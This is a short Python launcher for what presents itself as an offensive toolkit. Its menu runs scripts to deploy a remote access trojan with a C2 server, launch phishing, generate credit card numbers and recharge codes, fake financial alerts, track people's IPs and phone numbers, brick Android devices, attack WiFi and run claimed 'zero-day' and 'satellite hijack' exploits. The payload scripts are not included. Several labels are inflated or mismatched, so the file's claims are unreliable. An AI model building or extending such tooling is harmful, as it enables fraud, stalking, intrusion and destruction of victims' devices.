from banner import show_banner  
import os  

def run_tool(choice):  
    if choice == "1":  
        os.system("python3 core/rat_system/c2_server.py")  
    elif choice == "2":  
        os.system("python3 core/phishing_factory/send_phish.py")  
    elif choice == "3":  
        os.system("python3 core/finance_tools/card_mill.py")  
    elif choice == "4":  
        os.system("python3 core/phone_tools/tracker/ip_locator.py")  
    elif choice == "5":  
        os.system("python3 core/phone_tools/tracker/sim_locator.py")  
    elif choice == "6":  
        os.system("bash core/phone_tools/destroyer/bootloop_android.sh")  
    elif choice == "7":  
        os.system("python3 core/finance_tools/fake_alert.py")  
    elif choice == "8":  
        os.system("python3 core/finance_tools/mtn_gen.py")  
    elif choice == "9":  
        os.system("bash core/scripts/wifi_apocalypse.sh")  
    elif choice == "10":  
        os.system("python3 core/zero_day/satellite_hijack/griffin_attack.py")  
    elif choice == "11":  
        os.system("python3 core/zero_day/cve-2024-1337.py")  
    else:  
        print("Invalid choice!")  

def main_menu():  
    while True:  
        os.system("clear")  
        show_banner()  
        print("""  
    1. Deploy RAT  
    2. Launch Phishing  
    3. Generate CC  
    4. Track IP Address  
    5. Track Phone Number  
    6. Brick Devices  
    7. Fake Alerts  
    8. Recharge Generator  
    9. WiFi Ripper  
    10. GPS Spoofer  
    11. Zero-Day Exploits  
    99. EXIT  
        """)  
        choice = input("Choice: ")  
        if choice == "99":  
            break  
        run_tool(choice)  
        input("\nPress Enter to return to the menu...")  

if __name__ == "__main__":  
    main_menu()  
